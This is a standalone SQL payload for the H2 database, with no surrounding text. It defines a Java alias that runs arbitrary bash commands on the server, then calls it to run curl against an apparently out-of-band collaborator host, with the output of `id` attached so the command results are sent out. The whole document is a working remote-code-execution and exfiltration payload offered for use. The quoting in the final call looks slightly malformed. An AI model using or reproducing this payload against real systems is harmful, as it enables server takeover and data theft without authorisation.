CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws
java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new
java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimi
ter("\\A");
return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('curl https://ahvxn9s636ztqamaa56ogsfkxb31rq.oastify.com'`id`')
